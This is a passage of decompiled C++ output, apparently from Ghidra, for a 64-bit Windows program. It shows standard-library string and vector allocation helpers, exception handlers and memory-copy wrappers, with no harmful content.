        FUN_1400056e0(*(undefined8 *)(param_2 + 8),*(longlong *)(param_2 + 8) + param_3 * 8,
                      &local_68);
      }
    }
  }
  return;
}




void Catch_All_140004a20(undefined8 param_1,longlong param_2)

{
  FUN_140004530();
  FUN_140004b70(*(undefined8 *)(param_2 + 0x90),*(LPVOID *)(param_2 + 0x38));
                    /* WARNING: Subroutine does not return */
  _CxxThrowException((void *)0x0,(ThrowInfo *)0x0);
}




void Catch_All_140004a70(void)

{
  FUN_140004530();
                    /* WARNING: Subroutine does not return */
  _CxxThrowException((void *)0x0,(ThrowInfo *)0x0);
}




void FUN_140004ae0(void)

{
  undefined8 local_78 [8];
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_38 [40];
  undefined8 local_10;
  
  local_10 = 0xfffffffffffffffe;
  FUN_140003de0(local_38,"vector<T> too long");
  FID_conflict_length_error(local_78,local_38);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_78,(ThrowInfo *)&DAT_140019330);
}




void Unwind_140004b40(undefined8 param_1,longlong param_2)

{
  FUN_140003e90((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_2 + 0x60));
  return;
}




undefined8 FUN_140004b60(undefined8 param_1)

{
  return param_1;
}




void FUN_140004b70(undefined8 param_1,LPVOID param_2)

{
  thunk_FUN_14000b9c0(param_2);
  return;
}




void FUN_140004ba0(undefined8 param_1,ulonglong param_2)

{
  FUN_1400057d0(param_2);
  return;
}




longlong * FUN_140004bc0(longlong *param_1,longlong param_2,longlong param_3)

{
  FUN_140005250(param_1);
  param_1[1] = param_2;
  if (param_3 == 0) {
    FUN_1400073e0();
  }
  *param_1 = param_3;
  return param_1;
}




void FUN_140004c20(longlong *param_1)

{
  if (*param_1 == 0) {
    FUN_1400073e0();
  }
  if (param_1[1] == *(longlong *)(*param_1 + 8)) {
    FUN_1400073e0();
  }
  FUN_1400050a0(param_1[1]);
  return;
}




undefined8 FUN_140004c80(longlong param_1)

{
  return *(undefined8 *)(param_1 + 8);
}




longlong * FUN_140004c90(longlong *param_1,ulonglong param_2,longlong param_3)

{
  FUN_140005190(param_1,param_2,param_3);
  return param_1;
}




undefined1 * FUN_140004cd0(undefined1 *param_1,undefined1 *param_2,longlong param_3)

{
  longlong *plVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined1 *puVar4;
  longlong local_48 [2];
  undefined1 local_38 [16];
  undefined1 local_28 [24];
  
  puVar3 = local_28;
  for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = *param_1;
    param_1 = param_1 + 1;
    puVar3 = puVar3 + 1;
  }
  puVar3 = local_28;
  plVar1 = local_48;
  for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined1 *)plVar1 = *puVar3;
    puVar3 = puVar3 + 1;
    plVar1 = (longlong *)((longlong)plVar1 + 1);
  }
  plVar1 = FUN_140005160(local_48,param_3);
  puVar3 = local_38;
  for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = (char)*plVar1;
    plVar1 = (longlong *)((longlong)plVar1 + 1);
    puVar3 = puVar3 + 1;
  }
  puVar3 = local_38;
  puVar4 = param_2;
  for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  return param_2;
}




void FUN_140004d60(longlong *param_1,longlong *param_2)

{
  FUN_140005200(param_1,param_2);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    public: __cdecl std::ios_base::failure::failure(class std::ios_base::failure const & __ptr64)
   __ptr64
    public: __cdecl std::invalid_argument::invalid_argument(class std::invalid_argument const &
   __ptr64) __ptr64
    public: __cdecl std::length_error::length_error(class std::length_error const & __ptr64) __ptr64
    public: __cdecl std::out_of_range::out_of_range(class std::out_of_range const & __ptr64) __ptr64
   
   Library: Visual Studio 2005 Debug */

undefined8 * FID_conflict_length_error(undefined8 *param_1,longlong param_2)

{
  FID_conflict_runtime_error(param_1,param_2);
  *param_1 = std::length_error::vftable;
  return param_1;
}




undefined8 * FUN_140004dd0(undefined8 *param_1)

{
  *param_1 = 0;
  return param_1;
}




longlong FUN_140004df0(allocator<char> *param_1)

{
  __uint64 _Var1;
  undefined8 local_10;
  
  _Var1 = std::allocator<char>::max_size(param_1);
  if (_Var1 < 2) {
    local_10 = 1;
  }
  else {
    local_10 = _Var1 - 1;
  }
  return local_10;
}




void FUN_140004e40(allocator<char> *param_1,ulonglong param_2,__uint64 param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong lVar3;
  char *pcVar4;
  char *pcVar5;
  ulonglong local_40;
  
  uVar1 = param_2 | 0xf;
  uVar2 = FUN_140004df0(param_1);
  local_40 = param_2;
  if (((uVar1 <= uVar2) && (local_40 = uVar1, uVar1 / 3 < *(ulonglong *)(param_1 + 0x20) / 2)) &&
     (uVar1 = *(ulonglong *)(param_1 + 0x20), lVar3 = FUN_140004df0(param_1),
     *(ulonglong *)(param_1 + 0x20) <= lVar3 - uVar1 / 2)) {
    local_40 = *(ulonglong *)(param_1 + 0x20) / 2 + *(longlong *)(param_1 + 0x20);
  }
  pcVar4 = std::allocator<char>::allocate(param_1,local_40 + 1);
  if (param_3 != 0) {
    pcVar5 = std::
             basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
             ::_Myptr((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                       *)param_1);
    std::_Traits_helper::copy_s<struct_std::char_traits<char>_>(pcVar4,local_40 + 1,pcVar5,param_3);
  }
  FUN_140004040((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)param_1,'\x01',0);
  *(char **)(param_1 + 8) = pcVar4;
  *(ulonglong *)(param_1 + 0x20) = local_40;
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::_Eos
            ((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
              *)param_1,param_3);
  return;
}




undefined8 Catch_All_140004fc0(undefined8 param_1,longlong param_2)

{
  char *pcVar1;
  
  *(undefined8 *)(param_2 + 0x28) = *(undefined8 *)(param_2 + 0x78);
  pcVar1 = std::allocator<char>::allocate
                     (*(allocator<char> **)(param_2 + 0x70),*(longlong *)(param_2 + 0x28) + 1);
  *(char **)(param_2 + 0x50) = pcVar1;
  *(undefined8 *)(param_2 + 0x20) = *(undefined8 *)(param_2 + 0x50);
  return 0x140004f3f;
}




/* Library Function - Multiple Matches With Same Base Name
    int `protected: void __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> >::_Copy(unsigned __int64,unsigned __int64) __ptr64'::`1'::catch$0
    int `protected: void __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::allocator<char> >::_Copy(unsigned __int64,unsigned __int64) __ptr64'::`1'::catch$0
    int `protected: void __cdecl std::basic_string<unsigned short,struct std::char_traits<unsigned
   short>,class std::allocator<unsigned short> >::_Copy(unsigned __int64,unsigned __int64)
   __ptr64'::`1'::catch$0
    int `protected: void __cdecl std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
   std::allocator<wchar_t> >::_Copy(unsigned __int64,unsigned __int64) __ptr64'::`1'::catch$0
   
   Library: Visual Studio 2005 Debug */

void Catch_All_140005010(undefined8 param_1,longlong param_2)

{
  FUN_140004040(*(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                  **)(param_2 + 0x70),'\x01',0);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException((void *)0x0,(ThrowInfo *)0x0);
}




ulonglong FUN_140005050(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                        *param_1,char *param_2)

{
  char *pcVar1;
  
  pcVar1 = std::
           basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
           _Myptr(param_1);
  if (pcVar1 <= param_2) {
    pcVar1 = std::
             basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
             ::_Myptr(param_1);
    pcVar1 = pcVar1 + *(longlong *)(param_1 + 0x18);
    if (param_2 < pcVar1) {
      return CONCAT71((int7)((ulonglong)pcVar1 >> 8),1);
    }
  }
  return (ulonglong)pcVar1 & 0xffffffffffffff00;
}




longlong FUN_1400050a0(longlong param_1)

{
  return param_1 + 0x10;
}




void FUN_1400050b0(void)

{
  FUN_1400052d0();
  return;
}




void FUN_1400050d0(undefined8 param_1,undefined8 param_2,undefined1 *param_3)

{
  FUN_140005840(param_2,param_3);
  return;
}




void FUN_140005100(void)

{
  FUN_140005640();
  return;
}




/* WARNING: Removing unreachable block (ram,0x000140005149) */
/* Library Function - Multiple Matches With Same Base Name
    public: unsigned __int64 __cdecl std::allocator<unsigned short>::max_size(void)const __ptr64
    public: unsigned __int64 __cdecl std::allocator<wchar_t>::max_size(void)const __ptr64
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug, Visual Studio 2010 Debug, Visual
   Studio 2010 Release */

undefined8 max_size(void)

{
  return 0x1fffffffffffffff;
}




longlong * FUN_140005160(longlong *param_1,longlong param_2)

{
  FUN_140005310(param_1,param_2);
  return param_1;
}




longlong * FUN_140005190(longlong *param_1,ulonglong param_2,longlong param_3)

{
  FUN_140005250(param_1);
  if (((param_3 == 0) || (param_2 < *(ulonglong *)(param_3 + 8))) ||
     (*(ulonglong *)(param_3 + 0x10) < param_2)) {
    FUN_1400073e0();
  }
  *param_1 = param_3;
  param_1[1] = param_2;
  return param_1;
}




longlong FUN_140005200(longlong *param_1,longlong *param_2)

{
  if ((*param_1 == 0) || (*param_1 != *param_2)) {
    FUN_1400073e0();
  }
  return param_1[1] - param_2[1] >> 3;
}




undefined8 * FUN_140005250(undefined8 *param_1)

{
  FUN_140004dd0(param_1);
  return param_1;
}




/* Library Function - Single Match
    public: char * __ptr64 __cdecl std::allocator<char>::allocate(unsigned __int64) __ptr64
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

char * __thiscall std::allocator<char>::allocate(allocator<char> *this,__uint64 param_1)

{
  char *pcVar1;
  
  pcVar1 = _Allocate<char>(param_1,(char *)0x0);
  return pcVar1;
}




/* WARNING: Removing unreachable block (ram,0x0001400052b3) */
/* Library Function - Single Match
    public: unsigned __int64 __cdecl std::allocator<char>::max_size(void)const __ptr64
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug, Visual Studio 2010 Debug, Visual
   Studio 2010 Release */

__uint64 __thiscall std::allocator<char>::max_size(allocator<char> *this)

{
  return 0xffffffffffffffff;
}




/* WARNING: Removing unreachable block (ram,0x0001400052f9) */

undefined8 FUN_1400052d0(void)

{
  return 0xf4898d5f85bb39;
}




longlong * FUN_140005310(longlong *param_1,longlong param_2)

{
  if (*param_1 == 0) {
    FUN_1400073e0();
  }
  if ((*(ulonglong *)(*param_1 + 0x10) < (ulonglong)(param_1[1] + param_2 * 8)) ||
     ((ulonglong)(param_1[1] + param_2 * 8) < *(ulonglong *)(*param_1 + 8))) {
    FUN_1400073e0();
  }
  param_1[1] = param_1[1] + param_2 * 8;
  return param_1;
}




/* Library Function - Single Match
    char * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64)
   
   Library: Visual Studio 2005 Debug */

char * __cdecl
std::_Traits_helper::copy_s<struct_std::char_traits<char>_>
          (char *param_1,__uint64 param_2,char *param_3,__uint64 param_4)

{
  char *pcVar1;
  
  _Char_traits_cat<>();
  pcVar1 = (char *)FID_conflict_copy_s<struct_std::char_traits<wchar_t>_>
                             ((ulonglong *)param_1,param_2,param_3,param_4);
  return pcVar1;
}




void FUN_1400053f0(undefined8 param_1,longlong param_2,undefined8 *param_3)

{
  longlong lVar1;
  undefined1 *puVar2;
  undefined1 local_18 [16];
  
  puVar2 = local_18;
  for (lVar1 = 1; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_18[1] = FUN_140005a10();
  FUN_140005a30(param_1,param_2,param_3);
  return;
}




/* Library Function - Single Match
    char * __ptr64 __cdecl std::_Traits_helper::move_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64)
   
   Library: Visual Studio 2005 Debug */

char * __cdecl
std::_Traits_helper::move_s<struct_std::char_traits<char>_>
          (char *param_1,__uint64 param_2,char *param_3,__uint64 param_4)

{
  char *pcVar1;
  
  _Char_traits_cat<>();
  pcVar1 = (char *)FID_conflict_copy_s<struct_std::char_traits<wchar_t>_>
                             (param_1,param_2,param_3,param_4);
  return pcVar1;
}




void FUN_1400054b0(ulonglong param_1)

{
  undefined1 auVar1 [16];
  ulonglong local_res8;
  bad_alloc local_28 [40];
  
  if (param_1 == 0) {
    local_res8 = 0;
  }
  else {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_1;
    local_res8 = param_1;
    if (SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / auVar1,0) < 0x120) {
      std::bad_alloc::bad_alloc(local_28,(char *)0x0);
                    /* WARNING: Subroutine does not return */
      _CxxThrowException(local_28,(ThrowInfo *)&DAT_1400193e8);
    }
  }
  operator_new(local_res8 * 0x120);
  return;
}




/* Library Function - Single Match
    public: __cdecl std::bad_alloc::bad_alloc(char const * __ptr64) __ptr64
   
   Library: Visual Studio 2005 Debug */

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this,char *param_1)

{
  char *local_res10 [3];
  
  local_res10[0] = param_1;
  FUN_140007e40((undefined8 *)this,local_res10);
  *(undefined ***)this = vftable;
  return this;
}




void FUN_140005560(undefined8 *param_1)

{
  *param_1 = std::bad_alloc::vftable;
  FUN_140007fa0(param_1);
  return;
}




undefined8 * FUN_140005590(undefined8 *param_1,uint param_2)

{
  FUN_140005560(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




void FUN_1400055d0(undefined8 param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)FUN_140005630(8,param_1);
  if (puVar1 != (undefined8 *)0x0) {
    *puVar1 = *param_2;
  }
  return;
}




undefined8 FUN_140005630(undefined8 param_1,undefined8 param_2)

{
  return param_2;
}




void FUN_140005640(void)

{
  return;
}




void FUN_140005650(void)

{
  FUN_140005a10();
  FUN_140005af0();
  return;
}




void FUN_1400056a0(undefined8 param_1,undefined8 param_2,undefined8 param_3,void *param_4)

{
  FUN_140005b10(param_2,param_3,param_4,param_1);
  return;
}




void FUN_1400056e0(undefined8 param_1,undefined8 param_2,undefined8 *param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined8 local_res8;
  undefined8 local_res10;
  undefined8 *local_res18;
  
  local_res8 = param_1;
  local_res10 = param_2;
  local_res18 = param_3;
  puVar1 = (undefined8 *)FUN_140005ba0(&local_res10);
  puVar2 = (undefined8 *)FUN_140005ba0(&local_res8);
  FUN_140005bc0(puVar2,puVar1,local_res18);
  return;
}




void FUN_140005730(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  void *pvVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined8 local_res8;
  undefined8 local_res10;
  longlong local_res18;
  undefined1 local_28 [8];
  undefined8 local_20;
  longlong local_18;
  
  puVar3 = local_28;
  for (lVar2 = 1; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_res8 = param_1;
  local_res10 = param_2;
  local_res18 = param_3;
  local_28[1] = FUN_140005c20();
  local_20 = FUN_140005c00(local_28 + 2);
  local_18 = FUN_140005ba0(&local_res10);
  pvVar1 = (void *)FUN_140005ba0(&local_res8);
  FUN_140005c40(pvVar1,local_18,local_res18);
  return;
}




void FUN_1400057d0(ulonglong param_1)

{
  undefined1 auVar1 [16];
  ulonglong local_res8;
  bad_alloc local_28 [40];
  
  if (param_1 == 0) {
    local_res8 = 0;
  }
  else {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_1;
    local_res8 = param_1;
    if (SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / auVar1,0) < 8) {
      std::bad_alloc::bad_alloc(local_28,(char *)0x0);
                    /* WARNING: Subroutine does not return */
      _CxxThrowException(local_28,(ThrowInfo *)&DAT_1400193e8);
    }
  }
  operator_new(local_res8 << 3);
  return;
}




void FUN_140005840(undefined8 param_1,undefined1 *param_2)

{
  undefined1 *puVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined1 local_138 [296];
  
  puVar1 = (undefined1 *)FUN_140005630(0x10c,param_1);
  if (puVar1 != (undefined1 *)0x0) {
    puVar3 = local_138;
    for (lVar2 = 0x10c; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = *param_2;
      param_2 = param_2 + 1;
      puVar3 = puVar3 + 1;
    }
    puVar3 = local_138;
    for (lVar2 = 0x10c; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar1 = *puVar3;
      puVar3 = puVar3 + 1;
      puVar1 = puVar1 + 1;
    }
  }
  return;
}




/* Library Function - Single Match
    char * __ptr64 __cdecl std::_Allocate<char>(unsigned __int64,char * __ptr64)
   
   Library: Visual Studio 2005 Debug */

char * __cdecl std::_Allocate<char>(__uint64 param_1,char *param_2)

{
  undefined1 auVar1 [16];
  char *pcVar2;
  __uint64 local_res8;
  bad_alloc local_28 [40];
  
  if (param_1 == 0) {
    local_res8 = 0;
  }
  else {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_1;
    local_res8 = param_1;
    if (SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / auVar1,0) == 0) {
      bad_alloc::bad_alloc(local_28,(char *)0x0);
                    /* WARNING: Subroutine does not return */
      _CxxThrowException(local_28,(ThrowInfo *)&DAT_1400193e8);
    }
  }
  pcVar2 = (char *)operator_new(local_res8);
  return pcVar2;
}




undefined8 * FUN_140005940(undefined8 *param_1,longlong param_2)

{
  FUN_140007ef0(param_1,param_2);
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}




/* Library Function - Multiple Matches With Same Base Name
    struct std::_Secure_char_traits_tag __cdecl std::_Char_traits_cat<struct std::char_traits<char>
   >(void)
    struct std::_Secure_char_traits_tag __cdecl std::_Char_traits_cat<struct
   std::char_traits<unsigned short> >(void)
    struct std::_Secure_char_traits_tag __cdecl std::_Char_traits_cat<struct
   std::char_traits<wchar_t> >(void)
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

undefined1 _Char_traits_cat<>(void)

{
  undefined1 local_18;
  
  return local_18;
}




/* Library Function - Multiple Matches With Different Base Names
    char * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
    unsigned short * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<unsigned
   short> >(unsigned short * __ptr64,unsigned __int64,unsigned short const * __ptr64,unsigned
   __int64,struct std::_Secure_char_traits_tag)
    wchar_t * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<wchar_t> >(wchar_t
   * __ptr64,unsigned __int64,wchar_t const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
    char * __ptr64 __cdecl std::_Traits_helper::move_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
     6 names - too many to list
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

void FID_conflict_copy_s<struct_std::char_traits<wchar_t>_>
               (ulonglong *param_1,ulonglong param_2,void *param_3,ulonglong param_4)

{
  FID_conflict__Move_s(param_1,param_2,param_3,param_4);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    public: static char * __ptr64 __cdecl std::char_traits<char>::_Copy_s(char * __ptr64,unsigned
   __int64,char const * __ptr64,unsigned __int64)
    public: static unsigned short * __ptr64 __cdecl std::char_traits<unsigned
   short>::_Copy_s(unsigned short * __ptr64,unsigned __int64,unsigned short const * __ptr64,unsigned
   __int64)
    public: static wchar_t * __ptr64 __cdecl std::char_traits<wchar_t>::_Copy_s(wchar_t *
   __ptr64,unsigned __int64,wchar_t const * __ptr64,unsigned __int64)
    public: static char * __ptr64 __cdecl std::char_traits<char>::_Move_s(char * __ptr64,unsigned
   __int64,char const * __ptr64,unsigned __int64)
     6 names - too many to list
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

ulonglong *
FID_conflict__Move_s(ulonglong *param_1,ulonglong param_2,void *param_3,ulonglong param_4)

{
  FUN_1400080e0(param_1,param_2,param_3,param_4);
  return param_1;
}




undefined1 FUN_140005a10(void)

{
  undefined1 local_18;
  
  return local_18;
}




void FUN_140005a30(undefined8 param_1,longlong param_2,undefined8 *param_3)

{
  FUN_140005cb0(param_1,param_2,param_3);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    char * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
    unsigned short * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<unsigned
   short> >(unsigned short * __ptr64,unsigned __int64,unsigned short const * __ptr64,unsigned
   __int64,struct std::_Secure_char_traits_tag)
    wchar_t * __ptr64 __cdecl std::_Traits_helper::copy_s<struct std::char_traits<wchar_t> >(wchar_t
   * __ptr64,unsigned __int64,wchar_t const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
    char * __ptr64 __cdecl std::_Traits_helper::move_s<struct std::char_traits<char> >(char *
   __ptr64,unsigned __int64,char const * __ptr64,unsigned __int64,struct
   std::_Secure_char_traits_tag)
     6 names - too many to list
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

void FID_conflict_copy_s<struct_std::char_traits<wchar_t>_>
               (void *param_1,rsize_t param_2,void *param_3,rsize_t param_4)

{
  FID_conflict__Move_s(param_1,param_2,param_3,param_4);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    public: static char * __ptr64 __cdecl std::char_traits<char>::_Copy_s(char * __ptr64,unsigned
   __int64,char const * __ptr64,unsigned __int64)
    public: static unsigned short * __ptr64 __cdecl std::char_traits<unsigned
   short>::_Copy_s(unsigned short * __ptr64,unsigned __int64,unsigned short const * __ptr64,unsigned
   __int64)
    public: static wchar_t * __ptr64 __cdecl std::char_traits<wchar_t>::_Copy_s(wchar_t *
   __ptr64,unsigned __int64,wchar_t const * __ptr64,unsigned __int64)
    public: static char * __ptr64 __cdecl std::char_traits<char>::_Move_s(char * __ptr64,unsigned
   __int64,char const * __ptr64,unsigned __int64)
     6 names - too many to list
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2008 Debug */

void * FID_conflict__Move_s(void *param_1,rsize_t param_2,void *param_3,rsize_t param_4)

{
  memmove_s(param_1,param_2,param_3,param_4);
  return param_1;
}




void FUN_140005af0(void)

{
  return;
}




void FUN_140005b10(undefined8 param_1,undefined8 param_2,void *param_3,undefined8 param_4)

{
  undefined8 uVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined8 local_res8;
  undefined8 local_res10;
  void *local_res18;
  undefined8 local_res20;
  undefined1 local_18 [8];
  undefined8 local_10;
  
  puVar3 = local_18;
  for (lVar2 = 1; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_res8 = param_1;
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  local_18[1] = FUN_140005c20();
  local_10 = FUN_140005ba0(&local_res10);
  uVar1 = FUN_140005ba0(&local_res8);
  FUN_140005d10(uVar1,local_10,local_res18,local_res20);
  return;
}




void FUN_140005ba0(undefined8 *param_1)

{
  FUN_140005d50(param_1);
  return;
}




void FUN_140005bc0(undefined8 *param_1,undefined8 *param_2,undefined8 *param_3)

{
  undefined8 *local_res8;
  
  for (local_res8 = param_1; local_res8 != param_2; local_res8 = local_res8 + 1) {
    *local_res8 = *param_3;
  }
  return;
}




undefined8 FUN_140005c00(undefined8 param_1)

{
  return param_1;
}




undefined1 FUN_140005c20(void)

{
  undefined1 local_18;
  
  return local_18;
}




void FUN_140005c40(void *param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  undefined1 *puVar2;
  undefined1 local_18 [16];
  
  puVar2 = local_18;
  for (lVar1 = 1; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_18[1] = FUN_140005a10();
  FUN_140005d70(param_1,param_2,param_3);
  return;
}




void FUN_140005cb0(undefined8 param_1,longlong param_2,undefined8 *param_3)

{
  undefined1 *puVar1;
  longlong lVar2;
  undefined1 local_18 [16];
  
  puVar1 = local_18;
  for (lVar2 = 1; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  puVar1 = (undefined1 *)FUN_140005e00(local_18 + 1);
  FUN_140005e20(param_1,param_2,param_3,*puVar1);
  return;
}




void FUN_140005d10(undefined8 param_1,undefined8 param_2,void *param_3,undefined8 param_4)

{
  FUN_140005e90(param_1,param_2,param_3,param_4);
  return;
}




undefined8 FUN_140005d50(undefined8 *param_1)

{
  return *param_1;
}




void * FUN_140005d70(void *param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  void *_Dst;
  
  lVar1 = param_2 - (longlong)param_1 >> 3;
  _Dst = (void *)(param_3 + lVar1 * -8);
  if (0 < lVar1) {
    memmove_s(_Dst,lVar1 << 3,param_1,lVar1 << 3);
  }
  return _Dst;
}




undefined8 FUN_140005e00(undefined8 param_1)

{
  return param_1;
}




void FUN_140005e20(undefined8 param_1,longlong param_2,undefined8 *param_3,undefined1 param_4)

{
  undefined8 *puVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined8 local_res8;
  longlong local_res10;
  undefined8 *local_res18;
  undefined1 local_res20;
  undefined1 local_10 [8];
  
  puVar3 = local_10;
  for (lVar2 = 1; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_res8 = param_1;
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  puVar1 = (undefined8 *)FUN_140005ba0(&local_res8);
  FUN_140005f20(puVar1,local_res10,local_res18);
  return;
}




void FUN_140005e90(undefined8 param_1,undefined8 param_2,void *param_3,undefined8 param_4)

{
  void *pvVar1;
  longlong lVar2;
  undefined1 *puVar3;
  undefined8 local_res8;
  undefined8 local_res10;
  void *local_res18;
  undefined8 local_res20;
  undefined1 local_18 [8];
  longlong local_10;
  
  puVar3 = local_18;
  for (lVar2 = 1; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_res8 = param_1;
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  local_18[1] = FUN_140005a10();
  local_10 = FUN_140005ba0(&local_res10);
  pvVar1 = (void *)FUN_140005ba0(&local_res8);
  FUN_140005f70(pvVar1,local_10,local_res18);
  return;
}




void FUN_140005f20(undefined8 *param_1,longlong param_2,undefined8 *param_3)

{
  undefined8 *local_res8;
  longlong local_res10;
  
  local_res8 = param_1;
  for (local_res10 = param_2; local_res10 != 0; local_res10 = local_res10 + -1) {
    *local_res8 = *param_3;
    local_res8 = local_res8 + 1;
  }
  return;
}




void * FUN_140005f70(void *param_1,longlong param_2,void *param_3)

{
  longlong lVar1;
  
  lVar1 = param_2 - (longlong)param_1 >> 3;
  if (lVar1 != 0) {
    memmove_s(param_3,lVar1 << 3,param_1,lVar1 << 3);
  }
  return (void *)((longlong)param_3 + lVar1 * 8);
}




/* Library Function - Single Match
    __GSHandlerCheck
   
   Library: Visual Studio 2005 Release */

undefined8
__GSHandlerCheck(undefined8 param_1,ulonglong param_2,undefined8 param_3,longlong param_4)

{
  byte bVar1;
  uint *puVar2;
  ulonglong uVar3;
  
  puVar2 = *(uint **)(param_4 + 0x38);
  uVar3 = param_2;
  if ((*puVar2 & 4) != 0) {
    uVar3 = (longlong)(int)puVar2[1] + param_2 & (longlong)(int)-puVar2[2];
  }
  bVar1 = *(byte *)((ulonglong)*(uint *)(*(longlong *)(param_4 + 0x10) + 8) +
                    *(longlong *)(param_4 + 8) + 3);
  if ((bVar1 & 0xf) != 0) {
    param_2 = param_2 + (longlong)(int)(bVar1 & 0xfffffff0);
  }
  __security_check_cookie(param_2 ^ *(ulonglong *)((longlong)(int)(*puVar2 & 0xfffffff8) + uVar3));
  return 1;
}




void FUN_140006070(ulonglong *param_1,ulonglong param_2,ulonglong param_3)

{
  uint uVar1;
  ulonglong *puVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  
  uVar3 = param_3;
  if (7 < param_3) {
    param_2 = (param_2 & 0xff) * 0x101010101010101;
    if (0x3f < param_3) {
      uVar1 = -(int)param_1 & 7;
      if (uVar1 != 0) {
        uVar3 = param_3 - uVar1;
        *param_1 = param_2;
      }
      param_1 = (ulonglong *)((ulonglong)uVar1 + (longlong)param_1);
      param_3 = uVar3 & 0x3f;
      uVar3 = uVar3 >> 6;
      if (uVar3 != 0) {
        puVar2 = param_1;
        if (uVar3 < 0x1c00) {
          do {
            *puVar2 = param_2;
